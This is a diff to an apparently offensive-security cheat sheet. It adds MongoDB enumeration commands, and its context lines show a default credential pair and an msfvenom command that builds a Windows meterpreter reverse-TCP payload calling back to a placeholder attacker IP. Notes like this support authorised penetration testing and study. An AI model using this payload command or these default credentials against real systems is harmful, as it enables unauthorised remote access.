@@ -124,6 +124,14 @@ Default Credential
 admin:changeme
 ```
 
+### MongoDB (27017)
+```
+mongo
+show dbs
+use [DATABASE]
+show collections
+```
+
 # Working with MSFVENOM and MSFCONSOLE
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[MY_IP_ADDR] LPORT=4444 -f [asp/aspx/php/filetype] > [OUTPUT_FILE.asp/aspx/php/filetype]
